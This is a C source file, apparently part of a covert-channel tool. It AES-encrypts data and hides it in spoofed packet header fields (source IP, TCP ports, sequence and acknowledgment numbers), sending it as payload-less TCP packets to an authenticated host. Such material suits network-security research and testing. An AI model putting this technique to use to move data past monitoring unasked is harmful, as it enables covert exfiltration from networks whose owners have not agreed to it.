#include <string.h>
#include <stddef.h>
#include "../../include/data_noise/data_noise.h"
#include "../../include/packet_builder/packet_builder.h"
#include "../../include/upkd/auth.h"
#include "../../include/crypto/crypto.h"

#define TIMEOUT 1                               // Timeout between sending packets in seconds
#define CHARS_PER_PACKET 15                     // Number of characters to send in each packet
#define BYTES_PER_PACKET (CHARS_PER_PACKET + 1) // Number of bytes to send in each packet (encrypted data)

char *interfaceName;
char srcMac[18];

// Static function prototypes

/**
 * @brief Send a packet with the specified data.
 *
 * The data is encoded into the packet fields:
// * - Ethernet source MAC address - 6 bytes (we use last 1 byte)
 * - IP source address - 4 bytes
 * - TCP source port - 2 bytes
 * - TCP destination port - 2 bytes
 * - TCP sequence number - 4 bytes
 * - TCP acknowledgment number - 4 bytes
 *
 * @param data the data to send
 * @param position the position in the data to start sending from
 */
static void send_packet(char *data, size_t position);

// Public functions

void set_interface_name(char *name) {
    interfaceName = name;
}

void set_src_mac(char *mac) {
    strncpy(srcMac, mac, sizeof(srcMac));
}

const char *get_src_mac() {
    return srcMac;
}

const char *get_interface_name() {
    return interfaceName;
}

void send_noise(char *data, size_t dataLen) {
    // Check if the machine is authenticated
    if (!is_authenticated()) {
        printf("The machine is not authenticated\n");
        return;
    }

    printf("\nSending noise (%zu characters)\n", dataLen);

    // Calculate the number of packets needed
    size_t numberOfPackets = dataLen / (CHARS_PER_PACKET);
    if (dataLen % CHARS_PER_PACKET > 0) {
        numberOfPackets++;
    }

    // Allocate a buffer with enough space and copy the data into it
    size_t bufferSize = numberOfPackets * CHARS_PER_PACKET;
    char *buffer = malloc(bufferSize);
    if (buffer == NULL) {
        printf("Memory allocation failed\n");
        return;
    }
    memcpy(buffer, data, dataLen); // Copy the original data into the buffer

    // Set empty buffer characters to 0
    for (size_t i = dataLen; i < bufferSize; ++i) {
        buffer[i] = 0;
    }

    // Send the packets one by one
    for (size_t i = 0; i < numberOfPackets; ++i) {
        printf("Sending packet %zu/%zu\n", i + 1, numberOfPackets);
        fflush(stdout);

        send_packet(buffer, i * CHARS_PER_PACKET);
        sleep(TIMEOUT);
    }

    // Free the allocated memory
    free(buffer);
}

// Static functions

static void send_packet(char *data, size_t position) {

    // Encrypt data
    unsigned char encryptedData[BYTES_PER_PACKET];
    int encrypted_len = aes_cbc_encrypt((unsigned char *)data + position, encryptedData, BYTES_PER_PACKET - 1);


    // IP source address
    char srcIp[16];
    snprintf(srcIp, sizeof(srcIp), "%d.%d.%d.%d",
             (uint8_t) encryptedData[0],
             (uint8_t) encryptedData[1],
             (uint8_t) encryptedData[2],
             (uint8_t) encryptedData[3]
     );

    // TCP source port
    uint16_t srcPort = ((uint16_t) encryptedData[4] << 8) | (uint16_t)encryptedData[5];


    // TCP destination port
    uint16_t dstPort = ((uint16_t)encryptedData[6] << 8) | (uint16_t)encryptedData[7];

    // TCP sequence number
    uint32_t seqNum = ((uint32_t)encryptedData[8] << 24) |
                      (uint32_t)encryptedData[9] << 16 |
                      (uint32_t)encryptedData[10] << 8 |
                      (uint32_t)encryptedData[11];

    // TCP acknowledgment number
    uint32_t ackNum = ((uint32_t)encryptedData[12] << 24) |
                      (uint32_t)encryptedData[13] << 16 |
                      (uint32_t)encryptedData[14] << 8 |
                      (uint32_t)encryptedData[15];

    // Initialize PacketBuilder for the specified interface
    PacketBuilder *builder = PacketBuilder_init(interfaceName);

    // Build TCP SYN packet
    uint8_t *payload = NULL;
    uint32_t payload_len = 0;
    builder = PacketBuilder_build_transport_layer_TCP(builder, srcPort, dstPort, seqNum, ackNum, payload, payload_len);

    // Build IP packet
    uint8_t protocol = IPPROTO_TCP;
    const char *dstIp = get_auth_ip();
    builder = PacketBuilder_build_network_layer(builder, srcIp, dstIp, protocol, 0);

    // Build Ethernet packet

    // Ethernet source MAC address

    const char *dstMac = get_auth_mac();
    builder = PacketBuilder_build_data_link_layer(builder, srcMac, dstMac);

    // Send the packet
    builder = PacketBuilder_write_packet(builder);

    // Destroy the PacketBuilder
    PacketBuilder_destroy(builder);
}
